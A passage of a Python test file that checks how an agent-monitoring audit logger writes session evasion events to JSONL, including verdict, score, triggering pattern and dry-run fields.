                pattern_results=[
                    {"pattern": "circular_chaining", "score": 0.90, "reason": "Cycle"}
                ],
            )
            logger.close()

            lines = tmp_path.read_text(encoding="utf-8").strip().split("\n")
            entry = json.loads(lines[0])

            assert entry["event"] == "session_evasion"
            assert entry["session_id"] == "test-session-123"
            assert entry["tool"] == "execute_shell"
            assert entry["verdict"] == "EVASION_DETECTED"
            assert entry["aggregate_score"] == pytest.approx(0.90, abs=0.001)
            assert entry["triggering_pattern"] == "circular_chaining"
        finally:
            tmp_path.unlink(missing_ok=True)
            tmp_path.with_suffix(".syslog").unlink(missing_ok=True)

    def test_log_session_event_dry_run_flag(self):
        import json
        import tempfile
        from pathlib import Path
        from agentward.audit.logger import AuditLogger

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".jsonl", delete=False
        ) as f:
            tmp_path = Path(f.name)

        try:
            logger = AuditLogger(log_path=tmp_path)
            logger.log_session_event(
                session_id="s1",
                tool_name="tool_x",
                verdict="SUSPICIOUS",
                aggregate_score=0.60,
                triggering_pattern="reconnaissance",
                pattern_results=[],
                dry_run=True,
            )
            logger.close()

            entry = json.loads(tmp_path.read_text(encoding="utf-8").strip())
            assert entry["dry_run"] is True
        finally:
            tmp_path.unlink(missing_ok=True)
            tmp_path.with_suffix(".syslog").unlink(missing_ok=True)
